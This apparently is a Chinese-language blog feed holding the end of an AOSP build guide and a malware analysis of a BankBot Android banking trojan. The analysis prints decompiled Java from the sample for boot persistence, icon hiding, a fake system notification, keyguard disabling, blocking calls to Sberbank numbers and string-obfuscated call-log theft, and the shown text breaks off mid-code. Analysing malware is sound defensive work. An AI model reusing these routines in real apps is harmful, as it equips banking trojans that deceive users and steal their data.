æ˜¯å®šæ—¶åŒæ­¥çš„ï¼Œæ‰€ä»¥å®æ—¶æ€§å¹¶ä¸å¥½ï¼Œå¦‚æœé‡åˆ°æŸä¸ªç‰¹å®šç‰ˆæœ¬ä¸‹è½½å¤±è´¥ï¼Œ<br>å¯ä»¥ç­‰å¾…ä¸€æ®µæ—¶é—´åï¼Œå†é‡æ–°æ‰§è¡ŒåŒæ­¥å‘½ä»¤ã€‚ç¼–è¯‘æ—¶éœ€è¦çš„å†…å­˜æ¯”è¾ƒå¤§ï¼Œå°å†…å­˜å¯èƒ½å¯¼è‡´ç¼–è¯‘å¤±è´¥ï¼Œ<br>å¦å¤–ï¼Œå¦‚æœåœ¨è™šæ‹Ÿæœºé‡Œç¼–è¯‘çš„è¯ï¼Œè®°å¾—å¤šè®¾ç½®å‡ ä¸ªCPUæ ¸ï¼Œè¿™æ ·ç¼–è¯‘é€Ÿåº¦ä¼šå¿«ä¸€äº›ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/">https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/</a></li><li><a href="https://source.android.com/setup/build/downloading">https://source.android.com/setup/build/downloading</a></li><li><a href="https://source.android.com/setup/build/building">https://source.android.com/setup/build/building</a></li><li><a href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bankbot APK æ ·æœ¬åˆ†æ</title>
    <link href="/cn/BankBot/"/>
    <url>/cn/BankBot/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-æ ·æœ¬æ¦‚å†µ"><a href="#0x00-æ ·æœ¬æ¦‚å†µ" class="headerlink" title="0x00 æ ·æœ¬æ¦‚å†µ"></a>0x00 æ ·æœ¬æ¦‚å†µ</h2><table><thead><tr><th>å­—æ®µ</th><th>å†…å®¹</th></tr></thead><tbody><tr><td>æ ·æœ¬å</td><td>BankBot</td></tr><tr><td>MD5</td><td>3c42c391bec405bb28b28195c2961778</td></tr><tr><td>SHA256</td><td>93b64019ee48177889d908c393703a2a2fe05ca33793c14b175467ce619b1b94</td></tr><tr><td>æ–‡ä»¶ç±»å‹</td><td>APK</td></tr></tbody></table><p>è¿™æ˜¯ä¸€ä¸ªä»¥ç›—çªƒä¿¡ç”¨å¡ç”¨æˆ·å¯†ç ä¸ºä¸»è¦ç›®çš„çš„botã€‚å®‰è£…åæ˜¾ç¤ºä¸ºAndroidå›¾æ ‡ã€‚æ‰“å¼€Appå<br>ä¼šä»¥Androidç³»ç»Ÿæ›´æ–°çš„å½¢å¼ï¼Œè¯±å¯¼ç”¨æˆ·æ“ä½œè¾¾åˆ°å¸¸é©»ç³»ç»Ÿçš„ç›®çš„ã€‚</p><h2 id="0x01-è¡Œä¸ºåˆ†æ"><a href="#0x01-è¡Œä¸ºåˆ†æ" class="headerlink" title="0x01 è¡Œä¸ºåˆ†æ"></a>0x01 è¡Œä¸ºåˆ†æ</h2><h3 id="å¼€æœºè‡ªå¯åŠ¨"><a href="#å¼€æœºè‡ªå¯åŠ¨" class="headerlink" title="å¼€æœºè‡ªå¯åŠ¨"></a>å¼€æœºè‡ªå¯åŠ¨</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.android.market.Autorun&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span> <span class="hljs-attr">android:priority</span>=<span class="hljs-string">&quot;999&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span> <span class="hljs-attr">android:priority</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Autorun</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.android.market;<br><br><span class="hljs-keyword">import</span> android.content.BroadcastReceiver;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Autorun</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Autorun</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(context, Scheduler.class);<br>        v0.setFlags(<span class="hljs-number">0x10000000</span>);<br>        context.startService(v0);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¼€æœºå°†å¯åŠ¨ Schedule æœåŠ¡</p><h3 id="Schedule-æœåŠ¡"><a href="#Schedule-æœåŠ¡" class="headerlink" title="Schedule æœåŠ¡"></a>Schedule æœåŠ¡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent intent, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> startId)</span> &#123;<br>    <span class="hljs-built_in">super</span>.onStartCommand(intent, flags, startId);<br>    Utils.registerIfNeeded(((Context)<span class="hljs-built_in">this</span>));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getSystemService(<span class="hljs-string">&quot;alarm&quot;</span>);<br>    <span class="hljs-type">PendingIntent</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> PendingIntent.getBroadcast(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-number">0</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(((Context)<span class="hljs-built_in">this</span>), <br>            NetworkController.class), <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">v7</span> <span class="hljs-operator">=</span> FileController.fileExists(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-string">&quot;interval&quot;</span>) ? Integer.parseInt(FileController<br>            .readFile(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-string">&quot;interval&quot;</span>)) : <span class="hljs-number">0xA</span>;<br>    ((AlarmManager)v0).setRepeating(<span class="hljs-number">0</span>, System.currentTimeMillis() + <span class="hljs-number">0x2710</span>, ((<span class="hljs-type">long</span>)(v7 * <span class="hljs-number">0x3E8</span>)), <br>            v6);<br>    <span class="hljs-built_in">this</span>.handleCrashes();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Schedule æœåŠ¡ä½¿ç”¨alarm manager æ³¨å†Œä¸€ä¸ªå®šæ—¶ä»»åŠ¡ã€‚è¿™ä¸ªå®šæ—¶ä»»åŠ¡ç”±NetworkControllerå®Œæˆã€‚<br>æ—¶é—´é—´éš”ç”±é…ç½®æ–‡ä»¶intervalå†³å®šã€‚</p><p>com.android.market.FileController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">fileExists</span><span class="hljs-params">(Context context, String filename)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(context.getFilesDir(), filename).exists();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="éšè—App-å›¾æ ‡"><a href="#éšè—App-å›¾æ ‡" class="headerlink" title="éšè—App å›¾æ ‡"></a>éšè—App å›¾æ ‡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hideApp</span><span class="hljs-params">(Context context, <span class="hljs-type">boolean</span> hide)</span> &#123;<br>    <span class="hljs-type">ComponentName</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComponentName</span>(context.getPackageName(), String.valueOf(context.getPackageName())<br>             + <span class="hljs-string">&quot;.MainActivity&quot;</span>);<br>    <span class="hljs-type">PackageManager</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> context.getPackageManager();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> hide ? <span class="hljs-number">2</span> : <span class="hljs-number">1</span>;<br>    v3.setComponentEnabledSetting(v0, v1, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¼ªé€ çš„ç³»ç»ŸNotification"><a href="#ä¼ªé€ çš„ç³»ç»ŸNotification" class="headerlink" title="ä¼ªé€ çš„ç³»ç»ŸNotification"></a>ä¼ªé€ çš„ç³»ç»ŸNotification</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">super</span>.onCreate();<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppCrash</span>().Register(((Context)<span class="hljs-built_in">this</span>));<br>    <span class="hljs-type">Notification</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notification</span>(<span class="hljs-number">0x108008A</span>, <span class="hljs-string">&quot;Android system requires user action&quot;</span>, System.<br>            currentTimeMillis());<br>    <span class="hljs-type">Intent</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>.getApplicationContext(), AdminX.class);<br>    v1.setAction(<span class="hljs-string">&quot;android.intent.action.VIEW&quot;</span>);<br>    v1.setFlags(<span class="hljs-number">0x34000000</span>);<br>    v3.setLatestEventInfo(<span class="hljs-built_in">this</span>.getBaseContext(), <span class="hljs-string">&quot;Android&quot;</span>, <span class="hljs-string">&quot;Android system requires action&quot;</span>, PendingIntent<br>            .getActivity(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-number">0</span>, v1, <span class="hljs-number">0x8000000</span>));<br>    v3.flags |= <span class="hljs-number">0x62</span>;<br>    <span class="hljs-built_in">this</span>.startForeground(<span class="hljs-number">2</span>, v3);<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>(<span class="hljs-built_in">this</span>).execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Void</span>[<span class="hljs-number">0</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç¦ç”¨å±å¹•é”å®š"><a href="#ç¦ç”¨å±å¹•é”å®š" class="headerlink" title="ç¦ç”¨å±å¹•é”å®š"></a>ç¦ç”¨å±å¹•é”å®š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AdminX.<span class="hljs-built_in">this</span>.getSystemService(<span class="hljs-string">&quot;keyguard&quot;</span>).newKeyguardLock(<span class="hljs-string">&quot;ANDROID&quot;</span>).disableKeyguard();<br></code></pre></td></tr></table></figure><h3 id="ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯"><a href="#ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯" class="headerlink" title="ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯"></a>ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>    String[] v8;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> intent.getAction();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;state&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;incoming_number&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;android.intent.extra.PHONE_NUMBER&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;8005555550; 4955005550;&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v10</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;8005555550; 4955005550;&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v11</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">v9</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(action.equals(<span class="hljs-string">&quot;android.intent.action.NEW_OUTGOING_CALL&quot;</span>)) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> v5.replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>).replace(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<br>                <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">if</span>(v1 != <span class="hljs-literal">null</span>) &#123;<br>            v8 = v1.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;;&quot;</span>);<br>            <span class="hljs-keyword">if</span>(v8.length &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">int</span> v13;<br>                <span class="hljs-keyword">for</span>(v13 = <span class="hljs-number">0</span>; v13 &lt; v8.length; ++v13) &#123;<br>                    <span class="hljs-keyword">if</span>(v4.contains(v8[v13])) &#123;<br>                        v9 = <span class="hljs-number">1</span>;<br>                        v11 = String.valueOf(v11) + <span class="hljs-string">&quot;blocked outgoing call&quot;</span>;<br>                        <span class="hljs-built_in">this</span>.setResultData(<span class="hljs-literal">null</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(v9 == <span class="hljs-number">0</span>) &#123;<br>            v11 = String.valueOf(v11) + <span class="hljs-string">&quot;outgoing call&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReportWithDataTask</span>(context, <span class="hljs-string">&quot;call_data&quot;</span>).execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;[&quot;</span> + <span class="hljs-built_in">this</span>.toJSON(v4, <br>                v11) + <span class="hljs-string">&quot;]&quot;</span>&#125;);<br>    &#125;<br>  ...<br> &#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡ç½‘é¡µ <a href="http://www.sberbank.com/news-and-media/contacts">http://www.sberbank.com/news-and-media/contacts</a> ä¸­çš„ä¿¡æ¯æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š</p><p>8005555550 4955005550 è¿™ä¸¤ä¸ªå·ç  sberbank çš„å·ç ï¼Œåœ¨ä¿„ç½—æ–¯æ‹¨æ‰“å…è´¹ã€‚</p><h3 id="ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯"><a href="#ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯" class="headerlink" title="ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯"></a>ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">v10</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;8005555550; 4955005550;&quot;</span>;<br><br><span class="hljs-keyword">if</span>((action.equals(<span class="hljs-string">&quot;android.intent.action.PHONE_STATE&quot;</span>)) &amp;&amp; (v6.equals(<span class="hljs-string">&quot;RINGING&quot;</span>))) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> v3 != <span class="hljs-literal">null</span> ? v3.replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>).replace(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>).replace(<br>        <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>) : <span class="hljs-string">&quot;Unknown&quot;</span>;<br><span class="hljs-keyword">if</span>(v10 != <span class="hljs-literal">null</span>) &#123;<br>    v8 = v10.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;;&quot;</span>);<br>    <span class="hljs-keyword">for</span>(v13 = <span class="hljs-number">0</span>; v13 &lt; v8.length; ++v13) &#123;<br>        <span class="hljs-keyword">if</span>(v2.contains(v8[v13])) &#123;<br>            v11 = <span class="hljs-string">&quot;blocked incoming call&quot;</span>;<br>            v9 = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">this</span>.hangUp(context);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!v2.contains(<span class="hljs-string">&quot;Unknown&quot;</span>)) &#123;<br>        goto label_106;<br>    &#125;<br><br>    v11 = <span class="hljs-string">&quot;blocked incoming call&quot;</span>;<br>    v9 = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">this</span>.hangUp(context);<br>&#125;<br><br>label_106:<br><span class="hljs-keyword">if</span>(v9 == <span class="hljs-number">0</span>) &#123;<br>    v11 = <span class="hljs-string">&quot;incoming call&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ReportWithDataTask</span>(context, <span class="hljs-string">&quot;call_data&quot;</span>).execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;[&quot;</span> + <span class="hljs-built_in">this</span>.toJSON(v2, <br>        v11) + <span class="hljs-string">&quot;]&quot;</span>&#125;);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="éšç§çªƒå–"><a href="#éšç§çªƒå–" class="headerlink" title="éšç§çªƒå–"></a>éšç§çªƒå–</h3><h4 id="è·å–ç”µè¯æ‹¨æ‰“è®°å½•"><a href="#è·å–ç”µè¯æ‹¨æ‰“è®°å½•" class="headerlink" title="è·å–ç”µè¯æ‹¨æ‰“è®°å½•"></a>è·å–ç”µè¯æ‹¨æ‰“è®°å½•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> StringBuilder <span class="hljs-title function_">getCallLog</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">v20</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v18</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;O||U|T||||G|O|||I|N||G|&quot;</span>.replace(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-type">Cursor</span> <span class="hljs-variable">v10</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.context.getContentResolver().query(CallLog$Calls.CONTENT_URI, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <br>            <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v15</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;I++N+C+O+++M+I++N+G+&quot;</span>.replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v16</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;M-I--S--S---E--D---&quot;</span>.replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v22</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;***&#123;\&quot;n*u**mb**e*r\&quot;***:%s,\&quot;da****te\&quot;:%s,\&quot;d*u*ra****ti*o***n\&quot;:%s,\&quot;t*yp***e\&quot;:%s&#125;*&quot;</span><br>            .replace(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span>((v10.moveToFirst()) &amp;&amp; v10.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v17</span> <span class="hljs-operator">=</span> v10.getColumnIndex(<span class="hljs-string">&quot;number&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v21</span> <span class="hljs-operator">=</span> v10.getColumnIndex(<span class="hljs-string">&quot;type&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v11</span> <span class="hljs-operator">=</span> v10.getColumnIndex(<span class="hljs-string">&quot;date&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v14</span> <span class="hljs-operator">=</span> v10.getColumnIndex(<span class="hljs-string">&quot;duration&quot;</span>);<br>        <span class="hljs-keyword">while</span>(!v10.isAfterLast()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v19</span> <span class="hljs-operator">=</span> v10.getString(v17);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v9</span> <span class="hljs-operator">=</span> v10.getString(v21);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v7</span> <span class="hljs-operator">=</span> v10.getString(v11);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v8</span> <span class="hljs-operator">=</span> v10.getString(v14);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v13</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">switch</span>(Integer.parseInt(v9)) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: &#123;<br>                    v13 = v15;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: &#123;<br>                    v13 = v18;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: &#123;<br>                    v13 = v16;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br><br>            v20.append(String.format(Locale.US, v22, JSONObject.quote(v19), JSONObject.quote(<br>                    v7), 